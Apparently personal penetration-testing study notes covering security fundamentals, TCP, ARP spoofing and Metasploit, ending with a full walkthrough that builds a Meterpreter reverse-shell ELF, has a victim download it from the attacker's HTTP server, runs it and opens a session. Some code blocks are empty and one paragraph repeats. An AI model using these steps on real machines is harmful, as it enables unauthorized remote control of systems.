# VAPT and Cyber Security Notes

## 1) VAPT

**VAPT** = **Vulnerability Assessment and Penetration Testing**

It is used to identify, verify, and report security weaknesses in systems, applications, and networks.

### Common types of VAPT

* **Web App VAPT** - testing websites and web applications
* **Network VAPT** - testing internal/external networks, devices, and services
* **Mobile VAPT** - testing Android/iOS apps
* **Source Code Review** - checking application code for security flaws
* **API / GraphQL VAPT** - testing APIs for auth, data exposure, injection, and access control issues
* **Multi-Cloud VAPT** - testing security across cloud platforms such as AWS, Azure, and GCP
* **Bug Bounty** - ethical reporting of vulnerabilities through a reward program

### Related activities

* **Report management** - preparing, tracking, and maintaining VAPT findings and remediation status
* **Patch management** - applying updates and fixes to remove known vulnerabilities

---

## 2) Objectives of Cyber Security

Main goals:

* **Confidentiality**
* **Integrity**
* **Availability**
* **Authentication**
* **Non-repudiation** - means a person cannot later deny their action, message, or transaction. It is often supported by logs, digital signatures, and audit trails.

---

## 3) Important Terminology

* **Asset** - anything valuable that needs protection, such as data, servers, apps, or networks
* **Threat** - anything that can cause harm to an asset
* **Vulnerability** - a weakness that can be exploited by a threat
* **Risk** - the chance of loss or damage when a threat exploits a vulnerability
* **Bug** - an error or flaw in software; not always a security issue, but it can become one

---

## 4) Basic Fundamentals of Security

### CIA Triad

#### Confidentiality

Ensures information is accessed only by authorized users.

Controls used for confidentiality:

* Access control mechanisms
* Encryption / cryptography
* Steganography
* File permissions
* Whitelisting / blacklisting
* Enforcement by trusted systems such as the kernel

Confidentiality depends on:

* Proper assumptions
* Trust in the system and its components

#### Integrity

Ensures data is accurate, complete, and not modified without authorization.

Types of integrity:

* **Data integrity** - data remains correct and unchanged
* **Origin integrity** - the source of data is genuine and trustworthy

Integrity is supported by:

* Prevention mechanisms
* Detection mechanisms
* Correction mechanisms
* Trustworthiness of the system

Integrity applies to:

* Data in transmission
* Data at rest / storage

#### Availability

Ensures systems and data are accessible when needed.

A phrase often used:

* **An unavailable system is almost as bad as no system at all**

Availability depends on:

* Reliability
* Fault tolerance
* Redundancy
* Protection from attacks and failures

Threats to availability:

* **DoS (Denial of Service)**
* **DDoS (Distributed Denial of Service)**

DoS/DDoS attempts to block access to a service. They can be difficult to detect and distinguish from normal traffic.

---

## 5) Access Control Models

### Permission

A permission defines what a user or system is allowed to do.

### DAC, MAC

* **DAC (Discretionary Access Control)** - the owner decides who gets access
* **MAC (Mandatory Access Control)** - access is controlled by strict system rules, not by the user

# Common Security Threats

## 1) Snooping (Confidentiality Breach)

Unauthorized access to information without permission.

### Examples

* Packet sniffing
* Wiretapping
* Eavesdropping

### Result

Sensitive information is exposed to attackers.

### Diagram

```text
User  -------->  Server
          ^
          |
      Attacker listens
```
---

## 2) Modification or Alteration

(Confidentiality + Integrity Breach)

An attacker changes, delays, or modifies a message during transmission.

### Actions

* Stop the flow of messages
* Delay messages
* Modify message contents
* Release the modified message again

### Result

The receiver gets incorrect or tampered data.

### Diagram

```text
User -----> Attacker -----> Server
              |
        Message Modified
```
---

## 3) Masquerading / Spoofing

(Origin Integrity Breach)

An attacker pretends to be another legitimate user or system.

### Description

Unauthorized assumption of another identity to generate or distribute objects/messages under that identity.

### Examples

* Fake login pages
* IP spoofing
* Email spoofing

### Result

The victim trusts the attacker as a legitimate entity.

### Diagram

```text
Attacker pretending as User
Attacker(User) --------> Server
```
---

## 4) Repudiation of Origin

The sender denies sending a message or performing an action.

### Result

Lack of accountability and trust.

### Prevention

* Logs
* Audit trails
* Digital signatures

### Diagram

```text
User -----> Server
  |
  | "I never sent this message"
```
---

## 5) Denial of Receipt

The receiver denies receiving a message or data.

### Example

A user claims they never received an email or transaction.

### Prevention

* Delivery confirmation
* Acknowledgment systems
* Logs

### Diagram

```text
User -----> Receiver
                |
        "I did not receive it"
```
---

## 6) Delay Attack

An attacker intentionally delays message transmission.

### Result

Communication becomes slow or unreliable.

### Diagram

```text
User ----X----> Server
      Message Delayed
```
---

## 7) Denial of Service (DoS/DDoS)

(Availability Breach)

Attempts to make a system or service unavailable.

### Methods

* Crashing servers
* Overwhelming servers with traffic
* Destroying hardware/software
* Corrupting packets during transmission
* Modifying software subtly

### Types

* **DoS** - attack from one system
* **DDoS** - attack from multiple systems

### Result

Legitimate users cannot access services.

### Diagram

```text
Users ---> Server <--- Huge Fake Traffic
                    Attacker
```
---

# Man-in-the-Middle (MITM) Attack

An attacker secretly intercepts communication between two parties.

---

## Passive MITM

The attacker only listens to communication without changing data.

### Example

* Packet sniffing

### Diagram

```text
User --------> Server
      ^
      |
  Attacker listening
```
---

## Active MITM

The attacker modifies or manipulates transmitted data.

### Actions

* Modify messages
* Inject fake data
* Redirect communication

### Diagram

```text
User -----> Attacker -----> Server
              |
         Data Modified
```
---

# Important Note

In security attacks:

* **Cause and result are important**
* **Attacker intention is not always important**

Example:

Even accidental actions can still cause confidentiality, integrity, or availability breaches.

# Cyber Security Teams

Organizations use different security teams to protect systems, detect attacks, and improve security posture.

---

# Red Team (Offensive Security)

Red teams are ethical hackers and offensive security professionals.

## Responsibilities

Their job is to:

* Attack systems
* Find vulnerabilities
* Bypass defenses
* Simulate real-world attackers

They test how strong an organization's security is using attacker techniques such as:

* Phishing
* Exploitation
* Privilege escalation
* Lateral movement
* Social engineering

## Goal

Find weaknesses before real attackers do.

## Red Team Deliverables

The Red Team performs:

* Vulnerability assessments
* Penetration testing
* Security validation

They submit reports to the Blue Team including:

* Proof of Concept (PoC)
* Steps to reproduce the vulnerability
* Impact of vulnerabilities
* Risk severity
* Exploitation details
* Recommendations

## Diagram

```text
        Red Team
            |
 Simulate Real Attacks
            |
            v
+----------------------+
| Organization Systems |
+----------------------+
            |
      Vulnerability Report
            v
        Blue Team
```
---

# Blue Team (Defensive Security)

Blue teams are defensive security specialists.

## Responsibilities

Their job is to:

* Defend networks and systems
* Monitor security alerts
* Detect attacks
* Respond to incidents
* Improve defenses

## Tools Used

They commonly work with:

* SIEM tools
* Firewalls
* EDR/XDR
* IDS/IPS
* Threat hunting platforms

## Goal

Detect, stop, and respond to attacks.

## Blue Team Activities

* Analyze Red Team findings
* Create patch reports
* Fix vulnerabilities
* Improve detection rules
* Harden systems

After fixing issues, the Blue Team sends systems back to the Red Team for:

* Revalidation
* Retesting
* Security verification

* Updates monitoring and detection rules

After fixing the issues, the Blue Team sends the systems back to the Red Team for:

* Validation
* Retesting
* Security verification

This entire collaborative process is coordinated and improved by the Purple Team.

# Severity of a Bug / Vulnerability

The severity of a vulnerability is determined by its **impact** on the system, application, or organization.

Higher impact = Higher severity.

---

# Common Severity Levels

| Priority | Severity      | Description                                                     |
| -------- | ------------- | --------------------------------------------------------------- |
| P1       | Critical      | Can cause complete system compromise, RCE, or major data breach |
| P2       | High          | Serious impact but not complete compromise                      |
| P3       | Medium        | Moderate security risk                                          |
| P4       | Low           | Minor issue with limited impact                                 |
| P5       | Informational | No direct exploit, but useful security information disclosure   |

---

# Severity Flow

```text
Vulnerability Found
        |
        v
Analyze Impact
        |
        v
Assign Severity
(P1 -> P5)
```
---

# Severity Examples

## P1 - Critical

Very severe vulnerabilities.

### Examples

* Remote Code Execution (RCE)
* Authentication bypass
* Database compromise
* Admin account takeover

### Impact

Complete system compromise.

---

## P2 - High

### Examples

* SQL Injection with limited access
* Privilege escalation
* Sensitive data exposure

### Impact

Major security impact.

---

## P3 - Medium

### Examples

* Stored XSS
* Weak security configuration
* Limited information leakage

### Impact

Moderate risk.

---

## P4 - Low

### Examples

* Missing security headers
* Version disclosure
* Weak password policy

### Impact

Minor security issue.

---

## P5 - Informational

### Examples

* Server banner disclosure
* Debug messages
* Verbose error messages

### Impact

No direct exploitation, but useful information for attackers.

# CVE (Common Vulnerabilities and Exposures)

**CVE** stands for **Common Vulnerabilities and Exposures**.

It is a standardized system for identifying and cataloging publicly known cybersecurity vulnerabilities.

---

# CVE Format

A CVE ID follows this format:

```text
CVE-YYYY-NNNN
```
OR:

```text
CVE-Prefix-Year-ArbitraryDigits
```
### Structure

| Part | Meaning                              |
| ---- | ------------------------------------ |
| CVE  | Common Vulnerabilities and Exposures |
| YYYY | Year of assignment                   |
| NNNN | Unique arbitrary digits              |

---

```text

```
(Log4Shell vulnerability)

```text

```

# TCP Three-Way Handshake

TCP uses a **three-way handshake** to establish a reliable connection between two machines.

---

# TCP Flags

| Flag | Meaning                      |
| ---- | ---------------------------- |
| SYN  | Synchronize connection       |
| ACK  | Acknowledgment               |
| FIN  | Gracefully close connection  |
| RST  | Reset connection immediately |
| URG  | Urgent data                  |
| PSH  | Push data immediately        |

TCP flags are used to manage connections and data transfer.

---

# TCP Handshake Example

Assume:

* M1 = Client
* M2 = Server

---

# Connection Establishment

## Step 1 - SYN

M1 sends SYN packet to M2.

```text
M1 ------------------> M2
        SYN
```
---

## Step 2 - SYN-ACK

M2 responds with SYN + ACK.

```text
M1 <------------------ M2
      SYN + ACK
```
---

## Step 3 - ACK

M1 sends ACK.

```text
M1 ------------------> M2
          ACK
```
Connection established.

```text
TCP Tunnel Established
```
TCP establishes connections using SYN, SYN-ACK, and ACK packets.

---

# Gentle/Open Connection

TCP creates a reliable and graceful connection.

```text
SYN -> SYN/ACK -> ACK
```
This is called:

* TCP connection establishment
* Three-way handshake

---

# TCP Connection Closing

TCP usually closes connections gracefully using FIN and ACK packets.

---

## FIN Sequence

```text
M1 ------------------> M2
          FIN
M1 <------------------ M2
         ACK
M1 <------------------ M2
          FIN
M1 ------------------> M2
          ACK
```
```text
TCP Tunnel Closed
```
This is called:

* graceful close
* four-way termination

---

# RST (Reset)

If a machine does NOT follow TCP handshake rules, the destination machine may send:

```text
RST
```
RST means:

* immediately terminate/reset connection
* invalid or unexpected connection

Example:

* service not running
* malformed packets
* suspicious traffic

RST is used to forcefully terminate TCP connections.

---

# URG Flag

URG = Urgent flag.

Used to indicate:

* high-priority or urgent data

The urgent pointer field becomes active when URG is set.

---

# PSH Flag

PSH = Push flag.

Purpose:

* instruct receiver to immediately deliver data to the application layer without waiting for buffering.

```text
Sender ---> Receiver
      PSH Packet
```
PSH tells the destination to process the data immediately.

---

# TCP Retransmission Timeout (RTO)

Every TCP packet has an associated retransmission timeout (RTO).

If acknowledgment is not received within the timeout:

* packet is retransmitted.

Purpose:

* reliability
* error recovery

TCP uses retransmission and acknowledgments for reliable communication.

# Man-in-the-Middle (MITM) Attack

A **Man-in-the-Middle (MITM) attack** is a network attack where an attacker secretly intercepts communication between two parties.

The attacker can:

* monitor traffic
* steal sensitive information
* modify packets
* inject malicious data

The victims believe they are communicating directly with each other.

---

# Basic MITM Concept

```text
Victim A  <------>  Victim B
         |
         X
     Attacker
```
Example:

* User A sends data to User B
* Attacker intercepts packets
* Attacker forwards or modifies traffic

---

# ARP Spoofing / ARP Poisoning

One common MITM technique in LAN networks is:

```text
ARP Spoofing
```
ARP spoofing works by sending fake ARP replies to victims.

---

# ARP Table

Devices maintain an ARP table mapping:

| IP Address  | MAC Address       |
| ----------- | ----------------- |
| 192.168.1.1 | 00:11:22:33:44:55 |

MAC addresses contain:

* Vendor/OEM ID
* Unique device identifier

---

# Normal Communication

Without MITM:

```text
Victim A  ---- Switch ---- Gateway
```
Traffic flows directly.

---

# Communication After ARP Spoofing

```text
Victim A  <---->  Attacker  <---->  Gateway
```
Now all traffic passes through the attacker.

---

# How ARP Spoofing Works

## Step 1 - Poison Victim

Attacker tells Victim:

```text
Gateway IP = Attacker MAC
```
---

## Step 2 - Poison Gateway

Attacker tells Gateway:

```text
Victim IP = Attacker MAC
```
Now:

* victim trusts attacker
* gateway trusts attacker

---

# One-Way ARP Spoofing

Only one side is poisoned.

```text
Victim ---> Attacker ---> Gateway
```
### Result

* packet sniffing
* credential capture
* traffic monitoring

---

# Two-Way ARP Spoofing (Full MITM)

Both victim and gateway are poisoned.

```text
Victim A  <---->  Attacker  <---->  Gateway
```
Attacker can:

* read packets
* modify traffic
* inject malware
* redirect websites

| Feature             | One-Way ARP Spoofing        | Two-Way ARP Spoofing        |
| ------------------- | --------------------------- | --------------------------- |
| Poisoned Devices    | One side only               | Both victim and gateway     |
| Traffic Visibility  | Partial                     | Full                        |
| MITM Capability     | Limited                     | Complete                    |
| Packet Modification | Limited                     | Possible                    |
| Complexity          | Simpler                     | More complex                |
| Communication Flow  | Victim -> Attacker -> Gateway | Victim <-> Attacker <-> Gateway |

---

# The Attack: Poisoning Phase

## Fake ARP Replies Sent by Attacker

The attacker sends unsolicited, fake ARP replies (gratuitous ARP) to both parties simultaneously to overwrite their ARP cache memory.

To the user, the attacker says:

```text
Hey, I am the Gateway (192.168.1.1), send your traffic to my MAC address (CC:CC:CC:CC:CC:CC).
```

To the gateway, the attacker says:

```text
Hey, I am the User (192.168.1.50), send your traffic to my MAC address (CC:CC:CC:CC:CC:CC).
```

## Flaw 1: ARP Is Stateless

Operating systems do not keep a record of what ARP requests they have sent out. If a machine receives an ARP reply, it does not check its memory to see, "Did I actually ask for this information?"

## Flaw 2: No Verification

There is no cryptographic signature, handshake, or password required in an ARP packet. Any device on the local network can draft an ARP reply packet, put whatever IP and MAC addresses they want inside the payload, and send it out.

---

# Why ARP Spoofing Works

ARP protocol has:

```text
No Authentication
```

Systems automatically trust ARP replies and update ARP cache entries.

# Enable IP Forwarding
Linux systems need packet forwarding enabled for traffic relay.
## Check Status
```bash
cat /proc/sys/net/ipv4/ip_forward
```
Output:
```text
0 = disabled
1 = enabled
```
---
# Enable Forwarding
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

# Metasploit Framework

Metasploit is one of the most widely used exploitation frameworks. It supports many phases of a penetration testing engagement, including:

* information gathering
* vulnerability validation
* exploit development
* payload generation
* post-exploitation
* security testing

Metasploit has two main versions:

* **Metasploit Pro** - the commercial version used for automation and task management. It includes a graphical user interface (GUI).
* **Metasploit Framework** - the open-source version that works from the command line. It is commonly installed on penetration testing Linux distributions.

---

# Main Components of Metasploit

While using Metasploit Framework, the main interface is the Metasploit Console. It can be launched from the terminal using:

```bash
msfconsole
```

The console is used to interact with different Metasploit modules.

## Vulnerability

A vulnerability is a design, coding, or logic flaw affecting the target system. Exploiting a vulnerability can disclose confidential information or allow code execution on the target system.

## Exploit

An exploit is a piece of code that uses a vulnerability present on the target system.

## Payload

A payload is the code that runs on the target system after an exploit succeeds. Payloads are used to achieve the desired result, such as gaining access, opening a shell, or reading information.

---

# Metasploit Modules

## 1) Auxiliary

Auxiliary modules support tasks such as scanners, crawlers, and fuzzers.

## 2) Encoders

Encoders transform exploit or payload code, often to change its signature.

## 3) Evasion

Evasion modules are designed to help avoid detection by security controls.

## 4) Exploits

Exploit modules are organized by target system and vulnerability.

## 5) NOPs

NOPs (No Operation instructions) do nothing by themselves. They are often used as padding to achieve consistent payload sizes.

## 6) Payloads

Payload modules contain code that runs on the target system. Examples include getting a shell, running a command, or launching a proof-of-concept action.

## 7) Post

Post modules are used during the final stage of penetration testing, after access has been gained.

---

# msfconsole

## Launch Command

```bash
msfconsole
```

## help

The `help` command can be used on its own or for a specific command.

## history

The `history` command shows commands typed earlier in the current console session.

## use

The `use` command selects a module. It can be followed by a module path or by the number shown in search results.

## show

The `show` command displays available information, such as module options.

Example:

```bash
show options
```

## back

The `back` command leaves the current module context.

## search

The `search` command searches the Metasploit Framework database for modules relevant to a search term. Searches can use CVE numbers, exploit names, or target systems.

# Linux Meterpreter Payload Setup Steps
## 1) Start Metasploit
```bash
msfconsole
```
---
# 2) Select Linux Payload
```bash
use payload/linux/x64/meterpreter/reverse_tcp
```
This payload creates a reverse Meterpreter connection from the Linux target back to your machine.
---
# 3) Set Listener IP (Your Kali IP)
```bash
set LHOST 192.168.137.128
```
Check your IP:
```bash
ip a
```
---
# 4) Set Listener Port
```bash
set LPORT 8080
```
---
# 5) Generate ELF Payload
```bash
generate -f elf -o /home/kali/msf.elf
```
Explanation:
* `-f elf` -> Linux ELF executable
* `-o` -> output file location
Payloads can be generated using Metasploit payload generation features.
---
# 6) Start Multi Handler
```bash
use exploit/multi/handler
```
---
# 7) Configure Handler
```bash
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.137.128
set LPORT 8080
```
---
# 8) Start Handler
```bash
exploit
```
OR run in background:
```bash
exploit -j
```
You should see:
```text
[*] Started reverse TCP handler on 192.168.137.128:8080
```
The Metasploit multi/handler listens for reverse connections from the payload.
---
# 9) Deliver Payload to Victim
## Start Python HTTP Server
Use another port (NOT 8080):
```bash
cd /home/kali
python3 -m http.server 8000
```
---
# 10) Download Payload on Victim
On victim machine:
```bash
wget http://192.168.137.128:8000/msf.elf
```
OR:
```bash
curl -O http://192.168.137.128:8000/msf.elf
```
---
# 11) Make Payload Executable
```bash
chmod +x msf.elf
```
---
# 12) Run Payload
```bash
./msf.elf
```
---
# 13) Meterpreter Session Opens
Metasploit should show:
```text
[*] Meterpreter session 1 opened
```
---
# 14) Interact With Session
```bash
sessions
sessions -i 1
```
Now you get:
```text
meterpreter >
```
---
